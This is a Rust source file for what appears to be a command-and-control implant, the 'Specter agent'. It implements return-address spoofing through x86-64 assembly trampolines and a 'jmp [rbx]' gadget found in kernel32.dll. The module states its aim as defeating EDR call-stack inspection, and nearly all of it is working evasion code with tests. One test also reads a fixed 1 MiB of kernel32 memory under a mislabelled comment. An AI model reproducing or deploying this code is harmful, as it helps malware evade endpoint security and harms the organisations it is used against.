//! Return-address spoofing for the Specter agent.
//!
//! Manipulates the call stack so that sensitive Win32/NT calls appear to
//! originate from within a legitimate module (e.g. `kernel32.dll`) rather than
//! from the agent's own code.  This defeats EDR call-stack inspection that looks
//! for agent image addresses on the stack.
//!
//! ## Technique (based on AceLdr by Kyle Avery, as used in Demon)
//!
//! 1. Search the specified module for a `jmp [rbx]` gadget (`0xFF 0x23`).
//!    This gadget will serve as the synthetic "return address" seen by the target
//!    function.
//! 2. Set up a [`SpoofParams`] struct on the stack holding the gadget address,
//!    the real return address, and the current value of `rbx`.
//! 3. The `spoof_trampoline` assembly stub:
//!    - Replaces its own return address (on the stack) with the gadget address.
//!    - Stores `rbx = &SpoofParams` so the fixup label can find the struct.
//!    - Jumps to the target function.
//! 4. When the target function returns it lands at the `jmp [rbx]` gadget, which
//!    redirects to the `spoof_fixup` label.
//! 5. `spoof_fixup` restores `rbx` and jumps to the real caller.
//!
//! The target function's call stack (as seen by EDR) shows:
//!
//! ```text
//! target_function  ←  called-from: <gadget inside kernel32>
//! ```
//!
//! instead of the true:
//!
//! ```text
//! target_function  ←  called-from: <agent code>
//! ```
//!
//! ## Argument passing
//!
//! The spoof trampoline is invoked with 10 arguments:
//! `(arg1, arg2, arg3, arg4, &params, 0, arg5, arg6, arg7, arg8)`.
//!
//! Inside the trampoline:
//! - `pop r11` saves our real return address.
//! - `add rsp, 8` skips one shadow-space slot.
//! - `[rsp+24]` addresses the 5th argument (`&params`).
//! - After setup, `jmp r10` calls the target with `[rsp]` = gadget as its
//!   apparent return address and `rcx/rdx/r8/r9` holding the first four
//!   arguments.
//!
//! On non-Windows builds all public functions are no-ops or return `None`/`Err`
//! so Linux CI can compile the codebase without a Windows target.

use thiserror::Error;

// ── Error type ────────────────────────────────────────────────────────────────

/// Errors returned by the return-address spoof engine.
#[derive(Debug, Error)]
pub enum SpoofError {
    /// No `jmp [rbx]` gadget (`0xFF 0x23`) was found within the searched module.
    #[error("no jmp [rbx] gadget found in the target module")]
    NoGadgetFound,

    /// The module base address was null.
    #[error("module base address is null")]
    NullModuleBase,
}

// ── Types ─────────────────────────────────────────────────────────────────────

/// Parameters passed to the spoof trampoline.
///
/// Layout mirrors Demon's `PRM` struct exactly:
///
/// | Offset | Size | Field         | Purpose                                    |
/// |--------|------|---------------|--------------------------------------------|
/// | 0      | 8    | `trampoline`  | Initially gadget addr; overwritten to fixup|
/// | 8      | 8    | `real_return` | Real return address into caller             |
/// | 16     | 8    | `saved_rbx`   | Saved value of `rbx` before the call       |
#[repr(C)]
pub struct SpoofParams {
    /// Address of the `jmp [rbx]` gadget in a legitimate module.
    /// Overwritten in-flight by the assembly stub with the `spoof_fixup` address.
    pub trampoline: u64,
    /// Real return address — where execution should resume after the spoofed call.
    pub real_return: u64,
    /// Caller-saved value of `rbx`, restored by `spoof_fixup`.
    pub saved_rbx: u64,
}

/// A spoof engine initialised for a specific module.
///
/// Create one engine per legitimate module you want to spoof calls as coming
/// from.  The engine caches the gadget address so the scan only happens once.
#[derive(Debug)]
pub struct SpoofEngine {
    /// Address of the `jmp [rbx]` gadget found in the module, or `0` if
    /// unavailable.
    gadget: u64,
}

impl SpoofEngine {
    /// Create a new engine, scanning `module_base..module_base+module_size` for
    /// a `jmp [rbx]` (`0xFF 0x23`) gadget.
    ///
    /// # Safety
    ///
    /// `module_base` must be non-null and `module_base..module_base+module_size`
    /// must be a valid, readable memory range for the lifetime of this call
    /// (e.g. a mapped PE image whose lifetime is the process lifetime).
    ///
    /// # Errors
    ///
    /// Returns [`SpoofError::NullModuleBase`] if `module_base` is null, or
    /// [`SpoofError::NoGadgetFound`] if no gadget exists in the range.
    #[allow(unsafe_code)]
    pub unsafe fn new(module_base: *const u8, module_size: usize) -> Result<Self, SpoofError> {
        if module_base.is_null() {
            return Err(SpoofError::NullModuleBase);
        }
        // SAFETY: caller guarantees the range is valid and readable.
        let bytes = unsafe { std::slice::from_raw_parts(module_base, module_size) };
        let offset = find_jmp_rbx_gadget(bytes).ok_or(SpoofError::NoGadgetFound)?;
        let gadget = unsafe { module_base.add(offset) } as u64;
        Ok(Self { gadget })
    }

    /// Returns the cached gadget address.
    #[must_use]
    pub fn gadget_addr(&self) -> u64 {
        self.gadget
    }

    /// Returns `true` if a gadget was successfully located.
    #[must_use]
    pub fn is_ready(&self) -> bool {
        self.gadget != 0
    }
}

// ── Gadget search ─────────────────────────────────────────────────────────────

/// Scan `bytes` for the first occurrence of the `jmp [rbx]` encoding (`0xFF 0x23`).
///
/// Returns the byte **offset** within `bytes` of the first match, or `None`.
///
/// This gadget is required by the stack-spoof trampoline: when the target
/// function returns, it lands at this instruction, which redirects to the
/// `spoof_fixup` trampoline label via `[rbx]`.
pub fn find_jmp_rbx_gadget(bytes: &[u8]) -> Option<usize> {
    bytes.windows(2).position(|w| w[0] == 0xFF && w[1] == 0x23)
}

// ── x86-64 Windows assembly stubs ────────────────────────────────────────────
//
// Two assembly labels implement the call-stack spoof, mirroring Demon's
// `Spoof.x64.asm` (originally from AceLdr by Kyle Avery):
//
//   spoof_trampoline(arg1, arg2, arg3, arg4, &SpoofParams, 0, arg5..arg8)
//     Invoked with 10 arguments.  The assembly:
//       pop  r11          — save our real return address
//       add  rsp, 8       — skip first shadow-space slot
//       mov  rax, [rsp+24]— rax = &SpoofParams (5th arg at [rsp+24])
//       mov  r10, [rax]   — r10 = params.trampoline (gadget addr)
//       mov  [rsp], r10   — install gadget as target fn's return addr
//       mov  r10, [rax+8] — r10 = params.real_return (original target fn)
//       mov  [rax+8], r11 — params.real_return = our caller's return addr
//       mov  [rax+16], rbx— params.saved_rbx = rbx
//       lea  rbx, spoof_fixup(%rip) — rbx = &spoof_fixup
//       mov  [rax], rbx   — params.trampoline = &spoof_fixup
//       mov  rbx, rax     — rbx = &SpoofParams
//       jmp  r10          — jump to target fn
//
//   spoof_fixup:
//     Called when target fn returns to the jmp-rbx gadget → [rbx].
//       sub  rsp, 16      — realign stack
//       mov  rcx, rbx     — rcx = &SpoofParams
//       mov  rbx, [rcx+16]— restore caller's rbx
//       jmp  [rcx+8]      — jump to real return address

#[cfg(all(windows, target_arch = "x86_64"))]
#[allow(unsafe_code)]
mod spoof_asm {
    std::arch::global_asm!(
        ".intel_syntax noprefix",
        ".globl spoof_trampoline",
        "spoof_trampoline:",
        "  pop   r11",
        "  add   rsp, 8",
        "  mov   rax, QWORD PTR [rsp + 24]",
        "  mov   r10, QWORD PTR [rax]",
        "  mov   QWORD PTR [rsp], r10",
        "  mov   r10, QWORD PTR [rax + 8]",
        "  mov   QWORD PTR [rax + 8], r11",
        "  mov   QWORD PTR [rax + 16], rbx",
        "  lea   rbx, QWORD PTR [rip + spoof_fixup]",
        "  mov   QWORD PTR [rax], rbx",
        "  mov   rbx, rax",
        "  jmp   r10",
        "",
        ".globl spoof_fixup",
        "spoof_fixup:",
        "  sub   rsp, 16",
        "  mov   rcx, rbx",
        "  mov   rbx, QWORD PTR [rcx + 16]",
        "  jmp   QWORD PTR [rcx + 8]",
        ".att_syntax prefix",
    );
}

// ── Windows implementation ────────────────────────────────────────────────────

#[cfg(all(windows, target_arch = "x86_64"))]
#[allow(unsafe_code)]
mod imp {
    use std::ffi::c_void;

    use super::SpoofParams;

    // The spoof_trampoline takes 10 args as described in the module doc.
    // On Windows x64 the first 4 go in registers, the rest on the stack.
    // We declare a fixed 10-arg extern to let the compiler build the correct
    // call frame.
    unsafe extern "C" {
        fn spoof_trampoline(
            arg1: usize,
            arg2: usize,
            arg3: usize,
            arg4: usize,
            params: *mut SpoofParams,
            _null: usize,
            arg5: usize,
            arg6: usize,
            arg7: usize,
            arg8: usize,
        ) -> usize;
    }

    /// Call `target` via the stack-spoof trampoline with up to 8 arguments,
    /// making the call appear to originate from `gadget_addr`.
    ///
    /// `params` must be a valid, writable [`SpoofParams`] on the caller's stack
    /// with `trampoline` pre-filled with `gadget_addr` and `real_return` set to
    /// the address of the actual target function.
    pub unsafe fn call_spoofed(
        params: &mut SpoofParams,
        arg1: usize,
        arg2: usize,
        arg3: usize,
        arg4: usize,
        arg5: usize,
        arg6: usize,
        arg7: usize,
        arg8: usize,
    ) -> usize {
        unsafe {
            spoof_trampoline(
                arg1,
                arg2,
                arg3,
                arg4,
                params as *mut SpoofParams,
                0,
                arg5,
                arg6,
                arg7,
                arg8,
            )
        }
    }

    /// Convenience wrapper: call a 4-argument function with stack spoofing.
    pub unsafe fn spoof_call_4(
        gadget_addr: u64,
        target_fn: *const c_void,
        a: usize,
        b: usize,
        c: usize,
        d: usize,
    ) -> usize {
        let mut params =
            SpoofParams { trampoline: gadget_addr, real_return: target_fn as u64, saved_rbx: 0 };
        unsafe { call_spoofed(&mut params, a, b, c, d, 0, 0, 0, 0) }
    }

    /// Convenience wrapper: call a 6-argument function with stack spoofing.
    pub unsafe fn spoof_call_6(
        gadget_addr: u64,
        target_fn: *const c_void,
        a: usize,
        b: usize,
        c: usize,
        d: usize,
        e: usize,
        f: usize,
    ) -> usize {
        let mut params =
            SpoofParams { trampoline: gadget_addr, real_return: target_fn as u64, saved_rbx: 0 };
        unsafe { call_spoofed(&mut params, a, b, c, d, e, f, 0, 0) }
    }
}

/// Spoofed 4-argument function call.
///
/// Calls `target_fn(a, b, c, d)` via the stack-spoof trampoline so that the
/// call appears to originate from `gadget_addr` (a `jmp [rbx]` instruction
/// inside a legitimate module).
///
/// # Safety
///
/// - `gadget_addr` must point to a `jmp [rbx]` instruction in a mapped module.
/// - `target_fn` must be a valid function pointer accepting 4 `usize` arguments.
/// - The caller is responsible for ensuring correct argument types.
///
/// On non-Windows builds this is a no-op returning `0`.
#[cfg(all(windows, target_arch = "x86_64"))]
#[allow(unsafe_code)]
pub unsafe fn spoof_call_4(
    gadget_addr: u64,
    target_fn: *const std::ffi::c_void,
    a: usize,
    b: usize,
    c: usize,
    d: usize,
) -> usize {
    unsafe { imp::spoof_call_4(gadget_addr, target_fn, a, b, c, d) }
}

/// Spoofed 6-argument function call.
///
/// Calls `target_fn(a, b, c, d, e, f)` via the stack-spoof trampoline so that
/// the call appears to originate from `gadget_addr` (a `jmp [rbx]` instruction
/// inside a legitimate module).
///
/// # Safety
///
/// - `gadget_addr` must point to a `jmp [rbx]` instruction in a mapped module.
/// - `target_fn` must be a valid function pointer accepting 6 `usize` arguments.
/// - The caller is responsible for ensuring correct argument types.
///
/// On non-Windows builds this is a no-op returning `0`.
#[cfg(all(windows, target_arch = "x86_64"))]
#[allow(unsafe_code)]
pub unsafe fn spoof_call_6(
    gadget_addr: u64,
    target_fn: *const std::ffi::c_void,
    a: usize,
    b: usize,
    c: usize,
    d: usize,
    e: usize,
    f: usize,
) -> usize {
    unsafe { imp::spoof_call_6(gadget_addr, target_fn, a, b, c, d, e, f) }
}

// ── Non-Windows stub exports ──────────────────────────────────────────────────

/// # Safety
///
/// No-op stub on non-Windows targets — always safe to call.
#[cfg(not(all(windows, target_arch = "x86_64")))]
#[allow(unsafe_code)]
pub unsafe fn spoof_call_4(
    _gadget: u64,
    _target: *const std::ffi::c_void,
    _a: usize,
    _b: usize,
    _c: usize,
    _d: usize,
) -> usize {
    0
}

/// # Safety
///
/// No-op stub on non-Windows targets — always safe to call.
#[cfg(not(all(windows, target_arch = "x86_64")))]
#[allow(unsafe_code)]
pub unsafe fn spoof_call_6(
    _gadget: u64,
    _target: *const std::ffi::c_void,
    _a: usize,
    _b: usize,
    _c: usize,
    _d: usize,
    _e: usize,
    _f: usize,
) -> usize {
    0
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    #![allow(unsafe_code)]

    use super::*;

    /// `find_jmp_rbx_gadget` returns `None` for an empty slice.
    #[test]
    fn gadget_empty_returns_none() {
        assert!(find_jmp_rbx_gadget(&[]).is_none());
    }

    /// `find_jmp_rbx_gadget` returns `None` when the buffer is smaller than 2.
    #[test]
    fn gadget_too_small_returns_none() {
        assert!(find_jmp_rbx_gadget(&[0xFF]).is_none());
    }

    /// `find_jmp_rbx_gadget` finds `0xFF 0x23` at offset 0 and returns offset 0.
    #[test]
    fn gadget_found_at_start() {
        let buf: [u8; 4] = [0xFF, 0x23, 0x90, 0x90];
        assert_eq!(find_jmp_rbx_gadget(&buf), Some(0));
    }

    /// `find_jmp_rbx_gadget` finds `0xFF 0x23` in the middle and returns offset 3.
    #[test]
    fn gadget_found_in_middle() {
        let buf: [u8; 8] = [0x90, 0x90, 0x90, 0xFF, 0x23, 0x90, 0x90, 0x90];
        assert_eq!(find_jmp_rbx_gadget(&buf), Some(3));
    }

    /// `find_jmp_rbx_gadget` returns `None` when pattern is absent.
    #[test]
    fn gadget_absent_returns_none() {
        let buf: [u8; 8] = [0x90, 0xFF, 0x24, 0x00, 0x23, 0xFF, 0x22, 0x90];
        assert!(find_jmp_rbx_gadget(&buf).is_none());
    }

    /// `find_jmp_rbx_gadget` returns the first occurrence (offset 0) when
    /// multiple `0xFF 0x23` patterns are present.
    #[test]
    fn gadget_returns_first_occurrence() {
        let buf: [u8; 6] = [0xFF, 0x23, 0x90, 0xFF, 0x23, 0x90];
        assert_eq!(find_jmp_rbx_gadget(&buf), Some(0));
    }

    /// `SpoofParams` must match the expected repr(C) layout.
    ///
    /// | Offset | Field       | Size |
    /// |--------|-------------|------|
    /// | 0      | trampoline  | 8    |
    /// | 8      | real_return | 8    |
    /// | 16     | saved_rbx   | 8    |
    /// | total  |             | 24   |
    #[test]
    fn spoof_params_layout() {
        assert_eq!(std::mem::size_of::<SpoofParams>(), 24);
        assert_eq!(std::mem::align_of::<SpoofParams>(), 8);

        let p = SpoofParams {
            trampoline: 0xAAAA_BBBB_CCCC_DDDDu64,
            real_return: 0x1111_2222_3333_4444u64,
            saved_rbx: 0xFEED_FACE_DEAD_BEEFu64,
        };
        let raw = unsafe {
            std::slice::from_raw_parts(
                &p as *const SpoofParams as *const u8,
                std::mem::size_of::<SpoofParams>(),
            )
        };
        assert_eq!(&raw[0..8], &0xAAAA_BBBB_CCCC_DDDDu64.to_le_bytes());
        assert_eq!(&raw[8..16], &0x1111_2222_3333_4444u64.to_le_bytes());
        assert_eq!(&raw[16..24], &0xFEED_FACE_DEAD_BEEFu64.to_le_bytes());
    }

    /// `SpoofEngine::new` with a null pointer returns an error.
    #[test]
    fn spoof_engine_null_base_errors() {
        // SAFETY: null pointer — SpoofEngine::new detects and returns Err.
        let result = unsafe { SpoofEngine::new(std::ptr::null(), 256) };
        assert!(
            matches!(result, Err(SpoofError::NullModuleBase)),
            "expected NullModuleBase, got {result:?}"
        );
    }

    /// `SpoofEngine::new` returns `NoGadgetFound` when buffer has no gadget.
    #[test]
    fn spoof_engine_no_gadget_errors() {
        let buf = vec![0x90u8; 64];
        // SAFETY: buf is a valid heap allocation of 64 bytes.
        let result = unsafe { SpoofEngine::new(buf.as_ptr(), buf.len()) };
        assert!(
            matches!(result, Err(SpoofError::NoGadgetFound)),
            "expected NoGadgetFound, got {result:?}"
        );
    }

    /// `SpoofEngine::new` succeeds when buffer contains a gadget.
    #[test]
    fn spoof_engine_finds_gadget() {
        let mut buf = vec![0x90u8; 64];
        buf[32] = 0xFF;
        buf[33] = 0x23;
        // SAFETY: buf is a valid heap allocation of 64 bytes.
        let engine = unsafe { SpoofEngine::new(buf.as_ptr(), buf.len()) }
            .expect("engine must succeed when gadget is present");
        assert!(engine.is_ready());
        assert_eq!(engine.gadget_addr(), unsafe { buf.as_ptr().add(32) } as u64);
    }

    /// On Windows, `kernel32.dll` must contain a `jmp [rbx]` gadget.
    #[cfg(windows)]
    #[test]
    fn kernel32_contains_jmp_rbx_gadget() {
        use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;

        // SAFETY: null wide string → returns handle to kernel32.dll.
        let base = unsafe { GetModuleHandleW(windows_sys::w!("kernel32.dll")) };
        assert_ne!(base, 0, "kernel32.dll must be loaded");

        // SAFETY: kernel32.dll is always mapped for the lifetime of the process;
        // 1 MiB covers the entire image on all known Windows versions.
        let bytes = unsafe { std::slice::from_raw_parts(base as *const u8, 1024 * 1024) };
        let offset = find_jmp_rbx_gadget(bytes);
        assert!(offset.is_some(), "kernel32.dll must contain a jmp [rbx] (FF 23) gadget");
    }
}
